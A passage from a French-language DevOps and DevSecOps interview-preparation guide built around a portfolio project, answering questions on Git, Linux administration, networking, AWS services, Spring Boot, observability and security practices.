Alternative : GitFlow (branches feature/develop/release/hotfix) — plus adapté aux cycles de release planifiés.

---

### Q109 — Comment écrivez-vous de bons messages de commit ?

Convention Conventional Commits (utilisée dans ce projet) :
```
type(scope): description courte (impératif, < 72 chars)

Corps optionnel : pourquoi, pas comment

Co-Authored-By: ...
```

Types : `feat` (nouvelle feature), `fix` (bug), `docs`, `test`, `refactor`, `ci`, `chore`.

Exemples dans ce projet :
- `fix(deploy): ne remplacer que les images ECR dans docker-compose.yml`
- `test(frontend): couvrir ProjectFormComponent + exclure main.ts de SonarCloud`

Un bon message répond à "Si appliqué, ce commit va : [description]".

---

### Q110 — Qu'est-ce qu'un Git hook et comment l'utiliseriez-vous ?

Les Git hooks sont des scripts exécutés automatiquement à certains moments du workflow Git. Exemples :

- `pre-commit` : lancer ESLint/Prettier avant chaque commit local — empêche de committer du code non formaté
- `commit-msg` : valider le format du message de commit (Conventional Commits)
- `pre-push` : lancer les tests unitaires avant de pusher

Outils : `husky` (npm) configure les hooks pour toute l'équipe via `package.json`. `lint-staged` exécute les linters uniquement sur les fichiers modifiés (plus rapide).

---

## Linux & Systèmes

### Q111 — Quelles commandes Linux utilisez-vous au quotidien en DevOps ?

Commandes essentielles utilisées dans ce projet :

```bash
# Processus et ressources
top / htop          # Monitoring CPU/mémoire en temps réel
free -h             # Utilisation de la mémoire/swap
df -h               # Espace disque
ps aux | grep java  # Trouver le process Java

# Réseau
netstat -tlnp       # Ports en écoute
curl -sv            # Test HTTP avec headers verbose
ss -tlnp            # Alternative moderne à netstat

# Fichiers/logs
tail -f /var/log/nginx/access.log  # Logs en temps réel
journalctl -u nginx -f             # Logs systemd
grep -r "ERROR" /var/log/ --include="*.log"

# Systemd
systemctl status nginx
systemctl restart portfolio
```

---

### Q112 — Qu'est-ce que `systemd` et comment avez-vous configuré un service ?

`systemd` est le système d'init Linux (remplace SysV init). Il gère les services, les cibles de boot, les logs (journald).

Dans ce projet, le service `portfolio.service` :
```ini
[Unit]
Description=Portfolio Application Stack
After=docker.service
Requires=docker.service

[Service]
Type=oneshot
RemainAfterExit=yes
WorkingDirectory=/opt/portfolio
ExecStartPre=... # login ECR
ExecStart=/usr/bin/docker compose up -d
ExecStop=/usr/bin/docker compose down
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

`systemctl enable portfolio` → démarre au boot. `systemctl start portfolio` → démarre immédiatement.

---

### Q113 — Qu'est-ce que le swap sous Linux et quand est-il utilisé ?

Le swap est un espace disque utilisé comme extension de la RAM quand la mémoire physique est saturée. Plus lent que la RAM (100-1000x), mais évite les OOM kills.

Dans ce projet, 4GB de swap ont été créés sur l'EC2 t3.micro (1GB RAM) pour permettre à K3s + Spring Boot de coexister. Sur le t3.small (2GB RAM), le swap n'est plus utilisé en usage normal.

Création :
```bash
fallocate -l 4G /swapfile
chmod 600 /swapfile
mkswap /swapfile
swapon /swapfile
echo '/swapfile swap swap defaults 0 0' >> /etc/fstab
```

---

### Q114 — Qu'est-ce que `cron` et `crontab` ?

`cron` est le planificateur de tâches Unix. `crontab` édite les planifications.

Format : `minute heure jour_mois mois jour_semaine commande`

Exemples dans ce projet :
```cron
# Rafraîchir le token ECR toutes les 6h (token valide 12h)
0 */6 * * * root /usr/local/bin/refresh-ecr-token.sh

# Certbot renouvellement automatique (géré par systemd timer sur AL2023)
0 0,12 * * * root /usr/bin/certbot renew --quiet
```

`0 */6 * * *` = à la minute 0, toutes les 6 heures, tous les jours.

---

### Q115 — Qu'est-ce qu'un fichier `/etc/cron.d/` vs `crontab -e` ?

- `crontab -e` : édite la crontab de l'utilisateur courant. Les tâches s'exécutent avec ses permissions.
- `/etc/cron.d/` : répertoire pour les crontabs système. Chaque fichier peut spécifier un utilisateur différent par ligne. Géré par root, versionnables dans `/etc`.

Dans ce projet, `/etc/cron.d/ecr-token-refresh` contient le cron root pour le renouvellement ECR — plus propre qu'une crontab utilisateur.

---

## Réseau & Protocoles

### Q116 — Expliquez le handshake TLS/HTTPS.

TLS (Transport Layer Security) sécurise les communications HTTP. Le handshake :

1. **Client Hello** : client envoie les cipher suites supportées + random
2. **Server Hello** : serveur choisit une cipher suite, envoie son certificat
3. **Vérification** : client vérifie le certificat via la chaîne de certification (Let's Encrypt → ISRG Root X1)
4. **Key Exchange** : échange de clé via ECDHE (Perfect Forward Secrecy)
5. **Session établie** : communications chiffrées avec la clé dérivée

Let's Encrypt utilise le protocole ACME pour l'émission automatique. Certbot résout le challenge HTTP-01 (fichier dans `/.well-known/acme-challenge/`) pour prouver le contrôle du domaine.

---

### Q117 — Qu'est-ce que le DNS et comment DuckDNS fonctionne-t-il ?

Le DNS (Domain Name System) traduit les noms de domaine en adresses IP. Hiérarchie : Root → TLD (`.org`) → Domaine (`duckdns.org`) → Sous-domaine (`charrad-devsecops`).

DuckDNS fournit des sous-domaines gratuits avec une API simple. Pour mettre à jour l'IP :
```bash
curl "https://www.duckdns.org/update?domains=charrad-devsecops&token=TOKEN&ip=13.39.132.25"
```

Si l'IP de l'EC2 change (après un stop/start), il faut mettre à jour DuckDNS. Un cron ou un script dans le user-data automatiserait cette mise à jour.

---

### Q118 — Qu'est-ce que le HTTP/2 et quels sont ses avantages ?

HTTP/2 améliore HTTP/1.1 sur plusieurs points :

- **Multiplexing** : plusieurs requêtes sur une seule connexion TCP (vs une par connexion en HTTP/1.1)
- **Header compression** : HPACK compresse les headers répétitifs
- **Server Push** : le serveur peut envoyer des ressources avant que le client les demande
- **Binaire** : protocole binaire vs texte — plus efficace à parser

NGINX avec Let's Encrypt active HTTP/2 automatiquement sur HTTPS. Angular bénéficie particulièrement du multiplexing : le lazy loading charge plusieurs chunks en parallèle.

---

### Q119 — Qu'est-ce qu'un reverse proxy et en quoi NGINX en est un ?

Un **reverse proxy** se place devant les serveurs applicatifs et intercepte les requêtes clientes. Avantages :

- **SSL termination** : décrypte HTTPS avant de transmettre en HTTP interne
- **Load balancing** : distribue les requêtes entre plusieurs instances
- **Cache** : met en cache les réponses statiques
- **Sécurité** : cache l'architecture interne, rate limiting, filtrage

Dans ce projet, NGINX host écoute sur les ports 80/443 et proxie vers les containers Docker (frontend:8081, backend:8080, grafana:3000). Les containers ne sont pas directement exposés à internet.

---

### Q120 — Qu'est-ce que le CAP theorem ?

Le théorème CAP dit qu'un système distribué ne peut garantir que 2 des 3 propriétés simultanément :

- **Consistency** : tous les nœuds voient les mêmes données au même moment
- **Availability** : chaque requête reçoit une réponse (pas forcément la plus récente)
- **Partition tolerance** : le système continue à fonctionner malgré des partitions réseau

PostgreSQL est CA (Consistency + Availability) en Single-AZ — acceptable car il n'y a pas de partition réseau dans un datacenter.

Redis peut être configuré AP (Availability + Partition tolerance) avec Redis Cluster — quelques millisecondes de données perdues acceptables pour un cache.

---

## Advanced AWS

### Q121 — Qu'est-ce qu'un Elastic Load Balancer (ELB) et ses types ?

AWS propose 3 types de load balancers :

- **ALB** (Application LB) : couche 7 (HTTP/HTTPS). Route basé sur les headers, paths, host. Idéal pour les microservices et les WebSockets.
- **NLB** (Network LB) : couche 4 (TCP/UDP). Très haute performance, faible latence. Pour les flux non-HTTP.
- **GLB** (Gateway LB) : pour les appliances réseau tierces (firewalls, IDS).

Pour ce projet en production enterprise, un ALB remplacerait NGINX : routage `/api/*` → backend, `/*` → frontend, avec health checks natifs et intégration ACM pour les certificats.

---

### Q122 — Qu'est-ce qu'AWS CloudTrail ?

CloudTrail enregistre toutes les API calls AWS (qui a fait quoi, quand, depuis quelle IP). C'est l'audit trail complet de votre compte AWS.

Cas d'usage :
- Forensics après un incident de sécurité
- Compliance (PCI-DSS, SOC 2 exigent un audit trail)
- Détecter des API calls inhabituels (ex: `DeleteBucket` à 3h du matin)

Différence avec CloudWatch : CloudWatch monitore les **métriques** (CPU, latence), CloudTrail enregistre les **actions** (API calls).

---

### Q123 — Qu'est-ce qu'AWS Config ?

AWS Config enregistre en continu l'état de configuration de toutes les ressources AWS et évalue la conformité par rapport à des règles.

Exemple : règle "Les Security Groups ne doivent pas autoriser SSH depuis 0.0.0.0/0" → alerte immédiate si quelqu'un modifie un SG. Historique de configuration : retrouver comment un SG était configuré il y a 3 mois.

Complément à CloudTrail : Config dit **l'état** des ressources, CloudTrail dit **qui les a modifiées**.

---

### Q124 — Qu'est-ce qu'AWS WAF et quand l'utiliser ?

WAF (Web Application Firewall) filtre les requêtes HTTP malveillantes avant qu'elles atteignent l'application. Il inspecte : headers, body, query strings, IP source.

Règles managées AWS :
- Core Rule Set (OWASP Top 10)
- SQL injection protection
- Rate limiting par IP
- Blocage de pays entiers

Intégré à CloudFront, ALB ou API Gateway. Dans ce projet, OWASP ZAP simule les attaques que WAF bloquerait en production.

---

### Q125 — Qu'est-ce qu'AWS Systems Manager Session Manager ?

Session Manager permet de se connecter en SSH aux EC2 sans ouvrir le port 22, sans clé SSH. La connexion passe par l'agent SSM installé sur l'instance, tunnelé via HTTPS vers AWS.

Avantages sécurité :
- Port 22 fermé dans le SG (réduction de surface d'attaque)
- Toutes les sessions loggées dans CloudTrail
- Authentification via IAM, pas de clé partagée

Dans ce projet, on a ouvert le port 22 pour le CI/CD (compromis pragmatique). En production, Session Manager + IAM serait la solution cible.

---

### Q126 — Qu'est-ce qu'AWS Aurora et en quoi diffère-t-il de RDS PostgreSQL ?

Aurora est un moteur de DB propriétaire AWS, compatible PostgreSQL/MySQL mais reconstruit pour le cloud. Différences :

- **Storage** : Aurora utilise un storage distribué sur 6 copies dans 3 AZs — RDS utilise EBS classique
- **Performance** : 3-5x plus rapide que RDS PostgreSQL pour les workloads read-heavy
- **Serverless** : Aurora Serverless v2 scale automatiquement les ACUs (Aurora Capacity Units)
- **Coût** : plus cher que RDS classique (~20-30%)
- **Global Database** : réplication multi-région sub-seconde

Pour ce portfolio, RDS PostgreSQL standard est suffisant. Aurora serait justifié pour des millions de requêtes/jour.

---

### Q127 — Qu'est-ce qu'ElastiCache et quand l'utiliser plutôt qu'un Redis sur EC2 ?

ElastiCache est le service Redis/Memcached managé AWS. Avantages vs Redis auto-hébergé :

- **Multi-AZ avec failover automatique** : pas de downtime si un nœud tombe
- **Cluster mode** : sharding horizontal automatique
- **Backup** : snapshots automatiques vers S3
- **Monitoring** : métriques CloudWatch natives
- **Patches** : gérés par AWS

Dans ce portfolio, Redis tourne dans Docker Compose sur l'EC2 (plus simple, coût nul). Pour la production avec SLA, ElastiCache en mode cluster serait indispensable.

---

### Q128 — Qu'est-ce qu'AWS KMS et comment protège-t-il les secrets ?

KMS (Key Management Service) gère les clés de chiffrement de façon centralisée et auditée. Chaque utilisation d'une clé est loggée dans CloudTrail.

Dans ce projet, Secrets Manager chiffre les secrets avec une clé KMS (par défaut, la clé managée AWS `aws/secretsmanager`). Pour plus de contrôle, on créerait une Customer Managed Key (CMK) avec une rotation automatique et des policies IAM granulaires.

Avantage : même si quelqu'un vole le fichier de secrets chiffré, sans accès KMS il ne peut pas le déchiffrer.

---

### Q129 — Qu'est-ce qu'AWS STS et les rôles assumés ?

STS (Security Token Service) émet des credentials temporaires. Quand une Lambda ou un EC2 assume un rôle IAM, STS génère :
- `AccessKeyId` (temporaire, expire dans 1h-12h)
- `SecretAccessKey`
- `SessionToken`

C'est ce qui permet au pipeline deploy-app.yml de récupérer l'IP EC2 (`aws ec2 describe-instances`) sans credentials permanents dans GitHub Secrets — les credentials AWS_ACCESS_KEY_ID/SECRET configurés dans les secrets GitHub correspondent à un IAM User dédié CI/CD avec les permissions minimales nécessaires.

---

### Q130 — Qu'est-ce que le "Shared Responsibility Model" AWS ?

AWS et le client partagent la responsabilité de la sécurité :

**AWS est responsable de** : sécurité physique des datacenters, hyperviseur, réseau backbone, hardware.

**Vous êtes responsable de** : OS (patches), applications, données, IAM, chiffrement, configuration des Security Groups, secrets.

Exemple concret : AWS garantit que personne n'entre physiquement dans le datacenter. Vous garantissez que votre SG n'expose pas le port 5432 à internet.

---

## Performance & Scalabilité

### Q131 — Qu'est-ce que le connection pooling et pourquoi est-il critique ?

Créer une connexion PostgreSQL prend ~10-50ms (handshake TCP + authentification + allocation de processus serveur). Sans pooling, chaque requête HTTP ouvrirait et fermerait une connexion — catastrophique sous charge.

HikariCP (Spring Boot default) maintient un pool de connexions ouvertes. Config dans ce projet :
- `maximum-pool-size: 10` (t3.small → 10 connexions max)
- `minimum-idle: 2`
- `connection-timeout: 30000ms`
- `idle-timeout: 600000ms` (10min)

Métrique Micrometer : `hikaricp.connections.active` → si toujours à 10 sous charge, le pool est le bottleneck.

---

### Q132 — Qu'est-ce que l'index de base de données et quand en créer un ?

Un index est une structure de données (B-tree par défaut PostgreSQL) qui accélère les recherches. Sans index, chaque requête `WHERE` scanne toute la table (Sequential Scan).

Dans ce projet, index créés dans les migrations Flyway :
- `users.email` : unique + index (recherche par email à chaque login)
- `projects.status` : `findByStatus()` fréquent
- `projects.featured` : filtrage page d'accueil

**Ne pas indexer** : colonnes à faible cardinalité (booléens), colonnes rarement filtrées, tables très petites. Chaque index ralentit les INSERT/UPDATE.

---

### Q133 — Qu'est-ce que le Content Delivery Network (CDN) et comment optimise-t-il les performances ?

Un CDN distribue les assets statiques sur des serveurs géographiquement proches des utilisateurs. Au lieu de charger `bundle.js` depuis eu-west-3 (Paris) pour un utilisateur à Tokyo, il le charge depuis un PoP (Point of Presence) japonais.

Dans une architecture Angular :
- Les fichiers JS/CSS/images (immuables avec hash dans le nom) sont mis en cache indéfiniment
- Headers `Cache-Control: public, max-age=31536000, immutable`
- Seul `index.html` n'est pas mis en cache (il référence les autres fichiers)

CloudFront + S3 est la solution AWS typique pour les SPA Angular en production.

---

### Q134 — Qu'est-ce que la pagination et comment l'avez-vous implémentée ?

La pagination évite de charger toutes les données en une requête. Dans ce projet :

**Backend** : `Pageable` Spring Data → `SELECT * FROM projects LIMIT ? OFFSET ?` + COUNT total.
```java
Page<Project> findAll(Pageable pageable);
// appel : PageRequest.of(page, size, Sort.by("sortOrder"))
```

**Frontend** : `PageResponse<T>` DTO contenant `content`, `totalElements`, `totalPages`, `size`, `number`. L'Angular affiche les boutons de pagination basés sur ces métadonnées.

Optimisation : pour les grandes tables, `OFFSET` devient lent (PostgreSQL scanne quand même les lignes). Alternative : keyset pagination (`WHERE id > lastId`) pour les listes infinies.

---

### Q135 — Qu'est-ce que `@Async` dans Spring Boot et quand l'utiliser ?

`@Async` exécute la méthode dans un thread pool séparé (TaskExecutor), libérant le thread HTTP immédiatement. Le résultat est un `CompletableFuture<T>`.

Cas d'usage : envoi d'email, génération de rapport, notification webhook — opérations longues dont le résultat n'est pas immédiatement nécessaire.

**Piège** : `@Async` ne fonctionne pas si appelé depuis la même classe (proxy AOP). Nécessite `@EnableAsync` sur une `@Configuration`.

Dans ce projet, les Lambda gèrent l'async de façon plus robuste (EventBridge + Lambda = garantie de livraison).

---

## Patterns & Architecture

### Q136 — Qu'est-ce que le pattern Repository et pourquoi l'utilise-t-on ?

Le Repository abstrait la couche d'accès aux données derrière une interface. Le service ne sait pas si les données viennent de PostgreSQL, MongoDB ou d'un cache.

Avantages :
- Testabilité : `@Mock ProjectRepository` → pas de DB dans les tests unitaires
- Séparation des responsabilités : le service contient la logique métier, pas les requêtes SQL
- Évolutivité : changer de DB = implémenter une nouvelle classe de repository

Spring Data JPA génère l'implémentation à partir du nom des méthodes (`findByStatusOrderBySortOrderAsc`) — zéro SQL boilerplate pour 80% des cas.

---

### Q137 — Qu'est-ce que le pattern DTO et pourquoi ne pas exposer les entités directement ?

Un **DTO** (Data Transfer Object) est un objet spécialisé pour le transport de données entre couches. Exposer les entités JPA directement pose des problèmes :

- **Sécurité** : l'entité `User` contient le champ `password` hashé — ne doit jamais apparaître dans une API response
- **Couplage** : changer la DB (renommer une colonne) casse l'API
- **Lazy loading** : Jackson peut déclencher des requêtes SQL lors de la sérialisation des associations JPA
- **Flexibilité** : le DTO peut avoir un format différent de l'entité (dates formatées, champs calculés)

Dans ce projet : `ProjectResponse` (API out), `ProjectRequest` (API in), `Project` (entité DB) — trois objets distincts avec `ProjectMapper` pour les conversions.

---

### Q138 — Qu'est-ce que le pattern Singleton et comment Spring le gère-t-il ?

Le Singleton garantit qu'une seule instance d'une classe existe dans l'application. Spring implémente ce pattern nativement : par défaut, tous les beans Spring (`@Service`, `@Repository`, `@Controller`) sont des singletons gérés par le contexte.

Conséquence importante : les beans Spring doivent être **thread-safe** car plusieurs threads peuvent les utiliser simultanément. Éviter les champs d'instance mutable dans les services. Les données de requête doivent être dans des variables locales ou dans `ThreadLocal`.

---

### Q139 — Qu'est-ce que l'injection de dépendances (DI) et pourquoi l'utiliser ?

La DI est un pattern où les dépendances d'un objet lui sont fournies de l'extérieur plutôt qu'il les crée lui-même. Spring est un conteneur IoC (Inversion of Control) qui gère l'injection.

Avantages :
- **Testabilité** : injecter un mock à la place d'une vraie dépendance
- **Couplage faible** : `ProjectService` ne connaît que l'interface `ProjectRepository`, pas l'implémentation
- **Configurabilité** : changer l'implémentation sans toucher au code

Dans ce projet, injection par constructeur (recommandée) : `private final ProjectRepository projectRepository` injecté via le constructeur annoté `@Autowired` (implicite depuis Spring 4.3 avec un seul constructeur).

---

### Q140 — Qu'est-ce que l'AOP (Aspect Oriented Programming) dans Spring ?

L'AOP permet d'ajouter des comportements transversaux (logging, transaction, sécurité) sans les mélanger au code métier. Spring utilise des proxies dynamiques.

Exemples dans ce projet :
- `@Transactional` : Spring crée un proxy qui ouvre/ferme la transaction autour de la méthode
- `@Cacheable` : proxy qui vérifie Redis avant d'appeler la méthode
- `@PreAuthorize` : proxy qui vérifie les permissions avant l'exécution

Les aspects `@Around`, `@Before`, `@After` permettent de créer ses propres comportements transversaux (ex: logging automatique des temps de réponse).

---

## Platform Engineering

### Q141 — Qu'est-ce qu'une Internal Developer Platform (IDP) ?

Une IDP est une plateforme construite en interne qui abstrait la complexité de l'infrastructure pour les développeurs. Elle leur permet de déployer, monitorer et gérer leurs applications sans connaître Kubernetes, Terraform ou AWS.

Composants typiques :
- **Service Catalog** : templates de microservices, pipelines CI/CD prêts à l'emploi
- **Self-service** : un développeur crée un nouvel environnement de dev en 2 clics
- **Golden paths** : chemins recommandés pour déployer en respectant les standards de l'entreprise
- **Observabilité** : dashboards Grafana pré-configurés par type d'application

Outils : Backstage (Spotify), Port, Cortex. Ce portfolio est la fondation d'une telle plateforme.

---

### Q142 — Qu'est-ce que le concept de "You Build It, You Run It" ?

Popularisé par Amazon, ce principe dit que l'équipe qui développe un service est aussi responsable de son fonctionnement en production (pas une équipe Ops séparée).

Avantages : les développeurs font attention à la qualité, l'observabilité, les alertes car ce sont eux qui seront réveillés à 3h du matin si ça plante.

Conséquences pratiques : chaque équipe a son propre Runbook, ses propres SLOs, son accès direct à la prod, ses dashboards Grafana. Le rôle des équipes Platform/DevOps devient alors d'outiller ces équipes produit, pas de gérer la prod à leur place.

---

### Q143 — Qu'est-ce que le "shift-left security" ?

Shift-left = déplacer les activités de sécurité vers la gauche du cycle de développement (vers le début, pas à la fin).

Traditionnel : audit de sécurité en fin de projet → découverte tardive, corrections coûteuses.

Shift-left : sécurité dès le design (threat modeling), IDE plugins (Snyk, SonarLint), pre-commit hooks, SAST dans le CI, DAST sur chaque PR.

Dans ce projet : CodeQL + Checkstyle à chaque push (shift-left SAST), OWASP ZAP en CI (shift-left DAST), Dependabot (shift-left dépendances).

---

### Q144 — Qu'est-ce que le Feature Flagging et dans quel contexte l'utiliseriez-vous ?

Les feature flags permettent d'activer/désactiver des fonctionnalités en production sans redéploiement. Cas d'usage :

- **Dark launch** : déployer du code en production mais l'activer pour 1% des utilisateurs d'abord
- **A/B testing** : montrer deux versions d'une UI à des groupes différents
- **Kill switch** : désactiver une feature en cas de problème sans rollback complet
- **Progressive rollout** : activer graduellement (1% → 10% → 50% → 100%)

Outils : LaunchDarkly, Unleash, GrowthBook, ou un simple flag en DB. Spring Boot + `@ConditionalOnProperty` pour les flags simples.

---

### Q145 — Qu'est-ce que le Blue/Green Deployment ?

Deux environnements identiques (Blue = actuel, Green = nouveau). On déploie la nouvelle version sur Green, on la teste, puis on bascule le load balancer de Blue vers Green.

Avantages : rollback instantané (rebasculer vers Blue), zéro downtime, test en prod réelle.

Avec AWS : ALB + Target Groups (Blue Target Group et Green Target Group), modification des weights de routing.

Dans ce projet, le déploiement est plus simple : restart rolling du container Docker. Blue/Green serait implémenté avec ECS ou EKS + deux target groups ALB.

---

## OpenTelemetry & Observabilité avancée

### Q146 — Qu'est-ce qu'OpenTelemetry ?

OpenTelemetry (OTel) est un standard open-source pour l'observabilité. Il unifie les APIs de collecte de métriques, logs et traces en un seul framework, indépendant du backend (Jaeger, Zipkin, Datadog, etc.).

Dans Spring Boot 3, l'intégration OTel via Micrometer Tracing permet de :
- Propager automatiquement les `traceId` à travers les appels HTTP (W3C Trace Context)
- Corréler logs et traces : retrouver tous les logs d'une requête via son `traceId`
- Mesurer le temps passé dans chaque span (DB, HTTP, cache)

Ce projet utilise Micrometer (métriques) mais pas encore le tracing distribué — prochaine évolution naturelle.

---

### Q147 — Qu'est-ce qu'un span dans le distributed tracing ?

Un **trace** représente une requête de bout en bout (ex: GET /api/projects depuis Angular jusqu'à PostgreSQL).

Un **span** est une opération unitaire dans cette trace : `HTTP GET /api/projects` → span1 (controller), span2 (service), span3 (repository + SQL), span4 (Redis check).

Chaque span a : `traceId` (commun à toute la trace), `spanId`, `parentSpanId`, timestamp de début/fin, attributs.

Visualisé dans Jaeger/Zipkin : une cascade de spans montre exactement où le temps est passé. Si le span SQL prend 2s, c'est la DB qui est lente — pas le code applicatif.

---

### Q148 — Comment corréleriez-vous les logs avec les traces ?

En ajoutant le `traceId` dans chaque ligne de log. Avec Spring Boot + Micrometer Tracing :

```java
// Automatique avec spring.sleuth / micrometer-tracing
// Chaque log JSON inclut : {"traceId": "abc123", "spanId": "def456", ...}
```

Workflow d'investigation :
1. Alerte CloudWatch : erreur 5xx sur `/api/projects`
2. CloudWatch Logs : filtrer par `level=ERROR` → trouver le `traceId: abc123`
3. Jaeger : rechercher la trace `abc123` → voir le span SQL qui a pris 5s et échoué
4. PostgreSQL logs : croiser avec le `traceId` pour retrouver la requête exacte

---

### Q149 — Qu'est-ce que le profiling applicatif et quand l'utiliser ?

Le profiling mesure en détail où le temps CPU est passé dans l'application (méthode par méthode, microseconde par microseconde). Outils :

- **async-profiler** : profiler léger pour JVM, peut s'attacher à un process en production
- **JFR (Java Flight Recorder)** : intégré à la JVM, overhead minimal
- **VisualVM / JProfiler** : pour l'environnement de dev

Utilisation : quand les métriques montrent une latence élevée mais sans identifier la cause. Le profiler monte que `projectMapper.toResponse()` est appelé 10 000x et consomme 80% du CPU.

---

### Q150 — Qu'est-ce que Prometheus `PromQL` et donnez des exemples utiles.

PromQL est le langage de requête de Prometheus. Exemples pratiques :

```promql
# Taux de requêtes/sec sur les 5 dernières minutes
rate(http_server_requests_seconds_count[5m])

# p95 de latence (95% des requêtes sont plus rapides)
histogram_quantile(0.95, rate(http_server_requests_seconds_bucket[5m]))

# Taux d'erreur (5xx)
sum(rate(http_server_requests_seconds_count{status=~"5.."}[5m]))
  / sum(rate(http_server_requests_seconds_count[5m]))

# CPU JVM utilisé
process_cpu_usage * 100

# Connexions Hikari actives
hikaricp_connections_active{pool="HikariPool-1"}

# Auth failures/minute
rate(auth_login_failure_total[1m]) * 60
```

---

## DevSecOps Culture & Processus

### Q151 — Qu'est-ce que le "Three Ways" de DevOps (Gene Kim) ?

Le livre "The Phoenix Project" définit 3 principes fondamentaux DevOps :

1. **Flow** : optimiser le flux de travail de gauche à droite (dev → ops → client). Réduire les transferts, les silos, les files d'attente. CI/CD en est l'implémentation technique.

2. **Feedback** : créer des boucles de feedback de droite à gauche. Les problèmes de prod remontent vers le dev. Monitoring, alertes, post-mortems.

3. **Continuous Learning** : expérimentation, prise de risque calculée, apprentissage des échecs. Les post-mortems sans blâme (blameless post-mortems), les chaos experiments.

---

### Q152 — Qu'est-ce qu'un blameless post-mortem ?

Après un incident, un post-mortem analyse ce qui s'est passé, pourquoi, et comment éviter la récurrence. "Blameless" signifie que personne n'est blâmé — on analyse le système, pas les individus.

Structure d'un post-mortem :
1. Résumé de l'incident (durée, impact)
2. Timeline factuelle (heure par heure)
3. Analyse des causes racines (5 Whys)
4. Actions correctives (qui fait quoi, avant quelle date)
5. Ce qui a bien fonctionné

Philosophie : si quelqu'un a fait une erreur, c'est que le système lui a permis de la faire. Améliorer le système, pas punir la personne.

---

### Q153 — Comment priorisez-vous les vulnérabilités de sécurité ?

Système CVSS (Common Vulnerability Scoring System) : score 0-10.

- **Critique (9-10)** : patch immédiat, rollback si nécessaire
- **Élevé (7-8.9)** : patch dans les 48-72h
- **Moyen (4-6.9)** : patch dans le prochain sprint
- **Faible (0-3.9)** : backlog, à traiter selon disponibilité

Facteurs supplémentaires : exploitabilité réelle (PoC public disponible ?), exposition (interne vs internet-facing), données sensibles concernées.

Dans ce projet, OWASP Dependency Check bloque le pipeline si une CVE critique est détectée sur les dépendances.

---

### Q154 — Qu'est-ce qu'un Red Team / Blue Team en cybersécurité ?

- **Red Team** : attaquants. Simulent des attaques réelles (phishing, exploitation de vulnérabilités, intrusion physique). Objectif : trouver des failles avant les vrais attaquants.
- **Blue Team** : défenseurs. Détectent et répondent aux attaques. Monitoring, SOC, incident response.
- **Purple Team** : collaboration entre Red et Blue pour améliorer les deux.

Dans ce portfolio, OWASP ZAP joue le rôle d'un outil Red Team automatisé. Un vrai Red Team testerait aussi l'ingénierie sociale et les vecteurs non-techniques.

---

### Q155 — Qu'est-ce que le principe de Defense in Depth ?

Defense in Depth (défense en profondeur) : plusieurs couches de sécurité indépendantes. Si une couche est contournée, les autres restent.

Dans ce projet :
1. **Réseau** : SG restrictif, RDS en subnet privé
2. **Transport** : HTTPS (Let's Encrypt), SSL PostgreSQL
3. **Application** : JWT, RBAC, validation des inputs
4. **Données** : chiffrement at-rest RDS/Secrets Manager, BCrypt passwords
5. **CI/CD** : SAST, DAST, SCA, images signées
6. **Monitoring** : alertes sur comportements anormaux

Si une vulnérabilité contourne l'application (SQL injection), les données sont encore chiffrées (couche 4).

---

## Spring Boot Avancé

### Q156 — Qu'est-ce que Spring WebFlux et en quoi diffère-t-il de Spring MVC ?

Spring WebFlux est le framework réactif (non-bloquant) de Spring. Spring MVC est bloquant (thread-per-request).

- **Spring MVC** : chaque requête HTTP occupe un thread pendant toute sa durée (I/O inclus). Pool de 200 threads = 200 requêtes simultanées max.
- **WebFlux** : basé sur Project Reactor. Un thread gère des milliers de requêtes avec de l'I/O non-bloquant. Idéal pour les applications avec beaucoup d'I/O (appels réseau, DB).

Ce projet utilise Spring MVC + Virtual Threads (Java 21), qui donnent les performances de WebFlux avec la simplicité du code synchrone.

---

### Q157 — Qu'est-ce que Spring Boot Actuator ?

Actuator expose des endpoints de management et de monitoring pour une application Spring Boot :

- `/actuator/health` : état global de l'app (DB, Redis, disk)
- `/actuator/health/readiness` : prête à recevoir du trafic (utilisé par K8s/Docker healthcheck)
- `/actuator/health/liveness` : vivante (utilisé par K8s pour les restarts)
- `/actuator/metrics` : toutes les métriques Micrometer
- `/actuator/prometheus` : métriques au format Prometheus (scrapé toutes les 15s)
- `/actuator/info` : informations sur l'application (version, git commit)

Dans ce projet, les endpoints health sont en `permitAll()`, prometheus est protégé par SG AWS (pas accessible depuis internet).

---

### Q158 — Comment configurez-vous les profils Spring Boot ?

Les profils permettent d'avoir des configurations différentes par environnement. Fichiers de config :
- `application.properties` : config commune
- `application-prod.properties` : surcharge pour la prod
- `application-test.properties` : surcharge pour les tests

Activation : variable d'env `SPRING_PROFILES_ACTIVE=prod` dans le docker-compose.

Dans ce projet : `application-prod.properties` désactive les endpoints Actuator sensibles, configure le niveau de log `WARN` (vs `DEBUG` en dev), active la compression HTTP.

---

### Q159 — Qu'est-ce que Bean Validation et comment l'utilisez-vous ?

Bean Validation (JSR-380) permet d'annoter les champs d'un objet avec des contraintes. Spring Boot l'intègre automatiquement.

```java
public record ProjectRequest(
    @NotBlank @Size(min=2, max=200) String title,
    @NotBlank @Size(min=10) String description,
    @URL String githubUrl  // optionnel mais validé si présent
) {}
```

Avec `@Valid` sur le paramètre du controller, Spring valide automatiquement et renvoie un 400 structuré via `@ExceptionHandler(MethodArgumentNotValidException.class)`.

Avantage : validation déclarative, réutilisable, testable unitairement.

---

### Q160 — Qu'est-ce que Spring Data Specifications et quand l'utiliser ?

Les Specifications permettent de construire des requêtes dynamiques de façon type-safe. Utile pour les filtres combinables (ex: API de recherche avec 10 critères optionnels).

```java
Specification<Project> hasStatus(ProjectStatus status) {
    return (root, query, cb) -> cb.equal(root.get("status"), status);
}
Specification<Project> isFeatured() {
    return (root, query, cb) -> cb.isTrue(root.get("featured"));
}
// Combinaison : hasStatus(ACTIVE).and(isFeatured())
```

Alternative plus simple : méthodes de repository Spring Data avec nommage (`findByStatusAndFeatured`). Specifications pour les cas complexes.

---

## Tests Avancés

### Q161 — Qu'est-ce que le contract testing et Pact ?

Le contract testing vérifie que le contrat entre un consumer (Angular) et un provider (Spring Boot) est respecté, sans déployer les deux ensemble.

**Pact** :
1. Angular écrit un test qui définit ce qu'il attend de l'API (le "contrat")
2. Pact génère un fichier JSON de contrat
3. Spring Boot vérifie que son implémentation respecte ce contrat
4. Si l'API change de façon incompatible → le test Pact échoue côté provider

Avantage : détecter les breaking changes API sans integration test complet. Scalable pour les microservices avec des dizaines de consumers.

---

### Q162 — Qu'est-ce que le test de mutation (mutation testing) ?

Le mutation testing évalue la qualité des tests en introduisant des bugs (mutations) dans le code et vérifiant que les tests les détectent.

Exemple : changer `>` en `>=` dans une condition → si aucun test ne plante, les tests ne couvrent pas vraiment ce cas.

